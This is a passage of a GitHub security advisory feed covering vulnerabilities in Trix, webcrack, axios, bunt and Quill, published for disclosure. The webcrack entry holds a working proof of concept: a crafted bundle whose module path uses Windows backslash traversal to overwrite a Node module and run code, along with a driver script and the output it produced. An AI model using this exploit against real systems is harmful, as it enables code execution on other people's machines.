        <content type="html"><![CDATA[<p>The Trix editor, versions prior to 2.1.4, is vulnerable to XSS when pasting malicious code. This vulnerability is a bypass of the fix put in place for <a href="https://github.com/basecamp/trix/security/advisories/GHSA-qjqp-xr96-cj99">https://github.com/basecamp/trix/security/advisories/GHSA-qjqp-xr96-cj99</a>. In <a href="https://github.com/basecamp/trix/pull/1149">https://github.com/basecamp/trix/pull/1149</a>, we added sanitation for Trix attachments with a <code>text/html</code> content type. However, Trix only checks the content type on the paste event's <code>dataTransfer</code> object. As long as the <code>dataTransfer</code> has a content type of <code>text/html</code>, Trix parses its contents and creates an <code>Attachment</code> with them, even if the attachment itself doesn't have a <code>text/html</code> content type. Trix then uses the attachment content to set the attachment element's <code>innerHTML</code>.</p>
<h3 id="impact">Impact</h3>
<p>An attacker could trick a user to copy and paste malicious code that would execute arbitrary JavaScript code within the context of the user's session, potentially leading to unauthorized actions being performed or sensitive information being disclosed.</p>
<h3 id="patches">Patches</h3>
<p><strong>Update Recommendation:</strong> Users should upgrade to Trix editor version 2.1.4 or later, which incorporates proper sanitization of input from copied content.</p>
<h3 id="workarounds">Workarounds</h3>
<p>This is not really a workaround but something that should be considered in addition to upgrading to the patched version. If affected users can disallow browsers that don't support a Content Security Policy, then this would be an effective workaround for this and all XSS vulnerabilities. Set CSP policies such as <code>script-src 'self'</code> to ensure that only scripts hosted on the same origin are executed, and explicitly prohibit inline scripts using <code>script-src-elem</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/basecamp/trix/pull/1156">https://github.com/basecamp/trix/pull/1156</a></li>
<li><a href="https://github.com/basecamp/trix/releases/tag/v2.1.4">https://github.com/basecamp/trix/releases/tag/v2.1.4</a></li>
<li><a href="https://github.com/basecamp/trix/pull/1149">https://github.com/basecamp/trix/pull/1149</a></li>
<li><a href="https://github.com/basecamp/trix/security/advisories/GHSA-qjqp-xr96-cj99">https://github.com/basecamp/trix/security/advisories/GHSA-qjqp-xr96-cj99</a></li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/API/DataTransfer">MDN docs for <code>DataTransfer</code></a></li>
</ul>
<h3 id="credits">Credits</h3>
<p>This vulnerability was reported by HackerOne researcher <a href="https://hackerone.com/thwin_htet?type=user">thwin_htet</a>. </p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/basecamp/trix/security/advisories/GHSA-qjqp-xr96-cj99">https://github.com/basecamp/trix/security/advisories/GHSA-qjqp-xr96-cj99</a></li>
<li><a href="https://github.com/basecamp/trix/security/advisories/GHSA-qm2q-9f3q-2vcv">https://github.com/basecamp/trix/security/advisories/GHSA-qm2q-9f3q-2vcv</a></li>
<li><a href="https://github.com/basecamp/trix/pull/1149">https://github.com/basecamp/trix/pull/1149</a></li>
<li><a href="https://github.com/basecamp/trix/pull/1156">https://github.com/basecamp/trix/pull/1156</a></li>
<li><a href="https://github.com/basecamp/trix/commit/7656f578af0d03141a72a9d27cb3692e6947dae6">https://github.com/basecamp/trix/commit/7656f578af0d03141a72a9d27cb3692e6947dae6</a></li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/API/DataTransfer">https://developer.mozilla.org/en-US/docs/Web/API/DataTransfer</a></li>
<li><a href="https://github.com/basecamp/trix/releases/tag/v2.1.4">https://github.com/basecamp/trix/releases/tag/v2.1.4</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-43368">https://nvd.nist.gov/vuln/detail/CVE-2024-43368</a></li>
<li><a href="https://github.com/advisories/GHSA-qm2q-9f3q-2vcv">https://github.com/advisories/GHSA-qm2q-9f3q-2vcv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qm2q-9f3q-2vcv</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-14T18:11:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[webcrack] webcrack has an Arbitrary File Write Vulnerability on Windows when Parsing and Saving a Malicious Bundle]]></title>
        <id>https://github.com/advisories/GHSA-ccqh-278p-xq6w</id>
        <link href="https://github.com/advisories/GHSA-ccqh-278p-xq6w"/>
        <updated>2024-08-15T16:53:36.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>An arbitrary file write vulnerability exists in the webcrack module when processing specifically crafted malicious code on Windows systems. This vulnerability is triggered when using the unpack bundles feature in conjunction with the saving feature. If a module name includes a path traversal sequence with Windows path separators, an attacker can exploit this to overwrite files on the host system.</p>
<h3 id="details">Details</h3>
<p>Source: <a href="https://github.com/j4k0xb/webcrack/blob/241f9469e6401f3dabc6373233d85a5e76966b54/packages/webcrack/src/unpack/bundle.ts#L79">packages/webcrack/src/unpack/bundle.ts#L79</a></p>
<pre><code class="language-ts">import { posix } from 'node:path';
import type { Module } from './module';

// eslint-disable-next-line @typescript-eslint/unbound-method
const { dirname, join, normalize } = posix;

/* ... snip ... */

const modulePath = normalize(join(path, module.path));
if (!modulePath.startsWith(path)) {
    throw new Error(`detected path traversal: ${module.path}`);
}
await mkdir(dirname(modulePath), {
    recursive: true
});
await writeFile(modulePath, module.code, 'utf8');
</code></pre>
<p>In this code, the application explicitly relies on the POSIX version of path utilities (<code>dirname</code>, <code>join</code>, <code>normalize</code>) from Node.js. However, the vulnerability arises because the POSIX version of the <code>normalize</code> function does not recognize <code>\</code> as a path separator. As a result, on Windows systems, the path traversal check fails, allowing an attacker to write files to unintended locations.</p>
<h3 id="poc">PoC</h3>
<p>The following proof of concept demonstrates how this vulnerability can be exploited to overwrite and hijack the <code>debug</code> module in Node.js:</p>
<p><strong>Malicious Script (what.js):</strong></p>
<pre><code class="language-js">(function (e) {
    var n = {};
    function o(r) {
      if (n[r]) {
        return n[r].exports;
      }
      var a = (n[r] = {
        i: r,
        l: false,
        exports: {},
      });
      e[r].call(a.exports, a, a.exports, o);
      a.l = true;
      return a.exports;
    }
    o.p = '';
    o((o.s = 386));
  })({
    './\\..\\node_modules\\debug\\src\\index': function (e, t, n) {
        module.exports = () =&gt; console.log("pwned")
    },
  });
</code></pre>
<p><strong>Webcrack Script (index.js):</strong></p>
<pre><code class="language-js">import fs from 'fs';
import { webcrack } from 'webcrack';

const input = fs.readFileSync('what.js', 'utf8');

const result = await webcrack(input);
console.log(result.code);
console.log(result.bundle);
await result.save('output-dir');
</code></pre>
<p><strong>Execution:</strong>
Running the above script with <code>node index.js</code> twice results in the following output being printed to the terminal:</p>
<pre><code>PS C:\Webcrack&gt; node .\index.js
Debugger attached.
(function (e) {
  var n = {};
  function o(r) {
    if (n[r]) {
      return n[r].exports;
    }
    var a = n[r] = {
      i: r,
      l: false,
      exports: {}
    };
    e[r].call(a.exports, a, a.exports, o);
    a.l = true;
    return a.exports;
  }
  o.p = "";
  o(o.s = 386);
})({
  "./\\..\\node_modules\\debug\\src\\index": function (e, t, n) {
    module.exports = () =&gt; console.log("pwned");
  }
});
WebpackBundle {
  type: 'webpack',
  entryId: '386',
  modules: Map(1) {
    './\\..\\node_modules\\debug\\src\\index' =&gt; WebpackModule {
      id: './\\..\\node_modules\\debug\\src\\index',
      isEntry: false,
      path: '././\\..\\node_modules\\debug\\src\\index.js',
      ast: [Object]
    }
  }
}
Waiting for the debugger to disconnect...
PS C:\Webcrack&gt; node .\index.js
Debugger attached.
pwned
pwned
pwned
pwned
pwned
pwned
pwned
Waiting for the debugger to disconnect...
file:///C:/Webcrack/node_modules/webcrack/dist/index.js:444
  if (options.log) logger(`${name}: started`);
                   ^

TypeError: logger is not a function
    at applyTransforms (file:///C:/Webcrack/node_modules/webcrack/dist/index.js:444:20)
    at Array.&lt;anonymous&gt; (file:///C:/Webcrack/node_modules/webcrack/dist/index.js:4259:7)
    at webcrack (file:///C:/Webcrack/node_modules/webcrack/dist/index.js:4292:20)
    at async file:///C:/Webcrack/index.js:6:16

Node.js v18.16.0
</code></pre>
<p>This demonstrates that the debug module was successfully overwritten and hijacked to print <code>pwned</code> to the console, confirming the arbitrary file write vulnerability has lead to code execution.</p>
<h3 id="impact">Impact</h3>
<p>This vulnerability allows an attacker to write arbitrary <code>.js</code> files to the host system, which can be leveraged to hijack legitimate Node.js modules to gain arbitrary code execution.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/j4k0xb/webcrack/security/advisories/GHSA-ccqh-278p-xq6w">https://github.com/j4k0xb/webcrack/security/advisories/GHSA-ccqh-278p-xq6w</a></li>
<li><a href="https://github.com/j4k0xb/webcrack/commit/4bc5c6f353012ee7edc2cb39d01a728ab7426999">https://github.com/j4k0xb/webcrack/commit/4bc5c6f353012ee7edc2cb39d01a728ab7426999</a></li>
<li><a href="https://github.com/j4k0xb/webcrack/blob/241f9469e6401f3dabc6373233d85a5e76966b54/packages/webcrack/src/unpack/bundle.ts#L79">https://github.com/j4k0xb/webcrack/blob/241f9469e6401f3dabc6373233d85a5e76966b54/packages/webcrack/src/unpack/bundle.ts#L79</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-43373">https://nvd.nist.gov/vuln/detail/CVE-2024-43373</a></li>
<li><a href="https://github.com/advisories/GHSA-ccqh-278p-xq6w">https://github.com/advisories/GHSA-ccqh-278p-xq6w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-ccqh-278p-xq6w</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-08-14T18:01:06.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[axios] Server-Side Request Forgery in axios]]></title>
        <id>https://github.com/advisories/GHSA-8hc4-vh64-cxmj</id>
        <link href="https://github.com/advisories/GHSA-8hc4-vh64-cxmj"/>
        <updated>2024-08-13T19:53:25.000Z</updated>
        <content type="html"><![CDATA[<p>axios 1.7.2 allows SSRF via unexpected behavior where requests for path relative URLs get processed as protocol relative URLs.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-39338">https://nvd.nist.gov/vuln/detail/CVE-2024-39338</a></li>
<li><a href="https://github.com/axios/axios/releases">https://github.com/axios/axios/releases</a></li>
<li><a href="https://jeffhacks.com/advisories/2024/06/24/CVE-2024-39338.html">https://jeffhacks.com/advisories/2024/06/24/CVE-2024-39338.html</a></li>
<li><a href="https://github.com/axios/axios/issues/6463">https://github.com/axios/axios/issues/6463</a></li>
<li><a href="https://github.com/axios/axios/pull/6539">https://github.com/axios/axios/pull/6539</a></li>
<li><a href="https://github.com/axios/axios/pull/6543">https://github.com/axios/axios/pull/6543</a></li>
<li><a href="https://github.com/axios/axios/commit/6b6b605eaf73852fb2dae033f1e786155959de3a">https://github.com/axios/axios/commit/6b6b605eaf73852fb2dae033f1e786155959de3a</a></li>
<li><a href="https://github.com/axios/axios/releases/tag/v1.7.4">https://github.com/axios/axios/releases/tag/v1.7.4</a></li>
<li><a href="https://github.com/advisories/GHSA-8hc4-vh64-cxmj">https://github.com/advisories/GHSA-8hc4-vh64-cxmj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8hc4-vh64-cxmj</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-08-12T15:30:49.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@bunt/app] Prototype pollution in izatop bunt]]></title>
        <id>https://github.com/advisories/GHSA-p734-xg27-8cfq</id>
        <link href="https://github.com/advisories/GHSA-p734-xg27-8cfq"/>
        <updated>2024-08-13T19:23:51.000Z</updated>
        <content type="html"><![CDATA[<p>izatop bunt v0.29.19 was discovered to contain a prototype pollution via the component /esm/qs.js. This vulnerability allows attackers to execute arbitrary code via injecting arbitrary properties.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-38989">https://nvd.nist.gov/vuln/detail/CVE-2024-38989</a></li>
<li><a href="https://github.com/izatop/bunt/commit/c55201a8cee03e5282f99874dead988c80d31db7">https://github.com/izatop/bunt/commit/c55201a8cee03e5282f99874dead988c80d31db7</a></li>
<li><a href="https://gist.github.com/mestrtee/5e9830fb180a34d65f04fafb52d2b94b">https://gist.github.com/mestrtee/5e9830fb180a34d65f04fafb52d2b94b</a></li>
<li><a href="https://github.com/izatop/bunt/issues/27">https://github.com/izatop/bunt/issues/27</a></li>
<li><a href="https://github.com/advisories/GHSA-p734-xg27-8cfq">https://github.com/advisories/GHSA-p734-xg27-8cfq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p734-xg27-8cfq</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-08-12T15:30:49.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[quill] Cross-site Scripting in quill]]></title>
        <id>https://github.com/advisories/GHSA-4943-9vgg-gr5r</id>
        <link href="https://github.com/advisories/GHSA-4943-9vgg-gr5r"/>
        <updated>2024-08-09T14:41:51.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability in the HTML editor of Slab Quill allows an attacker to execute arbitrary JavaScript by storing an XSS payload (a crafted <code>onloadstart</code> attribute of an IMG element) in a text field. No patch exists and no further releases are planned.</p>
<p>This CVE is disputed. Researchers have claimed that this issue is not within the product itself, but is intended behavior in a web browser. More information can be found <a href="https://github.com/quilljs/quill/issues/3364">here</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-3163">https://nvd.nist.gov/vuln/detail/CVE-2021-3163</a></li>
<li><a href="https://github.com/quilljs/quill/issues/3273">https://github.com/quilljs/quill/issues/3273</a></li>
<li><a href="https://github.com/quilljs/quill/issues/3359">https://github.com/quilljs/quill/issues/3359</a></li>
<li><a href="https://burninatorsec.blogspot.com/2021/04/cve-2021-3163-xss-slab-quill-js.html">https://burninatorsec.blogspot.com/2021/04/cve-2021-3163-xss-slab-quill-js.html</a></li>
<li><a href="https://quilljs.com">https://quilljs.com</a></li>
<li><a href="https://github.com/quilljs/quill/issues/3364">https://github.com/quilljs/quill/issues/3364</a></li>
<li><a href="https://github.com/advisories/GHSA-4943-9vgg-gr5r">https://github.com/advisories/GHSA-4943-9vgg-gr5r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4943-9vgg-gr5r</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2021-05-10T15:38:12.000Z</published>
    </entry>
</feed>